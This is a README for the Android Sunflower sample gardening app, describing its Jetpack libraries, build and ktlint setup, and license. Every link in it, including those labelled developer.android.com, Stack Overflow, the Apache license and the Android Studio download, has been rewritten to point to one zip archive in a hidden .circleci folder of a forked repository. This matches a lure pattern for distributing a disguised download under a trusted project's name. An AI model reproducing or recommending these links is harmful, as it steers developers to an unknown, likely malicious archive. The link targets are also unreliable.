Android Sunflower (alpha)
=========================
[![CircleCI](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)

A gardening app illustrating Android development best practices with Android Jetpack.

Android Sunflower is currently released as an alpha and is under heavy development. To view the
latest changes, please visit the
[Releases page](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).
Note that some changes (such as database schema modifications) are not backwards
compatible during this alpha period and may cause the app to crash. In this
case, please uninstall and re-install the app.

Introduction
------------

Android Jetpack is a set of components, tools and guidance to make great Android apps. They bring
together the existing Support Library and Architecture Components and arranges them into four
categories:

![Android Jetpack](screenshots/jetpack_donut.png "Android Jetpack Components")

Android Sunflower demonstrates utilizing these components to create a simple gardening app.
Read the
[Introducing Android Sunflower](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)
article for a walkthrough of the app.

Getting Started
---------------
This project uses the Gradle build system. To build this project, use the
`gradlew build` command or use "Import Project" in Android Studio.

There are two Gradle tasks for testing the project:
* `connectedAndroidTest` - for running Espresso on a connected device
* `test` - for running unit tests

For more resources on learning Android development, visit the
[Developer Guides](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip) at
[developer.android.com](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).

Screenshots
-----------

![List of plants](screenshots/phone_plant_list.png "A list of plants")
![Plant details](screenshots/phone_plant_detail.png "Details for a specific plant")
![My Garden](screenshots/phone_my_garden.png "Plants that have been added to your garden")

Libraries Used
--------------
* [Foundation][0] - Components for core system capabilities, Kotlin extensions and support for
  multidex and automated testing.
  * [AppCompat][1] - Degrade gracefully on older versions of Android.
  * [Android KTX][2] - Write more concise, idiomatic Kotlin code.
  * [Test][4] - An Android testing framework for unit and runtime UI tests.
* [Architecture][10] - A collection of libraries that help you design robust, testable, and
  maintainable apps. Start with classes for managing your UI component lifecycle and handling data
  persistence.
  * [Data Binding][11] - Declaratively bind observable data to UI elements.
  * [Lifecycles][12] - Create a UI that automatically responds to lifecycle events.
  * [LiveData][13] - Build data objects that notify views when the underlying database changes.
  * [Navigation][14] - Handle everything needed for in-app navigation.
  * [Room][16] - Access your app's SQLite database with in-app objects and compile-time checks.
  * [ViewModel][17] - Store UI-related data that isn't destroyed on app rotations. Easily schedule
     asynchronous tasks for optimal execution.
  * [WorkManager][18] - Manage your Android background jobs.
* [UI][30] - Details on why and how to use UI Components in your apps - together or separate
  * [Animations & Transitions][31] - Move widgets and transition between screens.
  * [Fragment][34] - A basic unit of composable UI.
  * [Layout][35] - Lay out widgets using different algorithms.
* Third party
  * [Glide][90] for image loading
  * [Kotlin Coroutines][91] for managing background threads with simplified code and reducing needs for callbacks

[0]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[1]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[2]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[4]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[10]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[11]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[12]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[13]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[14]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[16]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[17]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[18]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[30]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[31]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[34]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[35]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[90]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
[91]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip

Upcoming features
-----------------
Updates will include incorporating additional Jetpack components and updating existing components
as the component libraries evolve.

Interested in seeing a particular feature of the Android Framework or Jetpack implemented in this
app? Please open a new [issue](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).

Android Studio IDE setup
------------------------
For development, the latest version of Android Studio 3.3 is required. The latest version can be
downloaded from [here](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).

Sunflower uses [ktlint](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip) to enforce Kotlin coding styles.
Here's how to configure it for use with Android Studio (instructions adapted
from the ktlint [README](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)):

- Close Android Studio if it's open

- Download ktlint using these [installation instructions](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)

- Inside the project root directory run:

  `./ktlint --apply-to-idea-project --android`

- Start Android Studio

Additional resources
--------------------
Check out these Wiki pages to learn more about Android Sunflower:

- [Notable Community Contributions](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)

- [Publications](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)

Non-Goals
---------
The focus of this project is on Android Jetpack and the Android framework.
Thus, there are no immediate plans to implement features outside of this scope.

A note on dependency injection - while many projects (such as
[Plaid](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)) use
[Dagger 2](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip) for DI, there are no plans to
incorporate DI into Sunflower.  This allows developers unfamiliar with dependency
injection to better understand Sunflower's code without having to learn DI.

Support
-------

- Google+ Community: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
- Stack Overflow:
  - https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
  - https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip

If you've found an error in this sample, please file an issue:
https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip

Patches are encouraged, and may be submitted by forking this project and submitting a pull request
through GitHub.

Third Party Content
-------------------
Select text used for describing the plants (in `plants.json`) are used from Wikipedia via CC BY-SA 3.0 US (license in `ASSETS_LICENSE`).

License
-------

Copyright 2018 Google, Inc.

Licensed to the Apache Software Foundation (ASF) under one or more contributor
license agreements.  See the NOTICE file distributed with this work for
additional information regarding copyright ownership.  The ASF licenses this
file to you under the Apache License, Version 2.0 (the "License"); you may not
use this file except in compliance with the License.  You may obtain a copy of
the License at

  https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the
License for the specific language governing permissions and limitations under
the License.
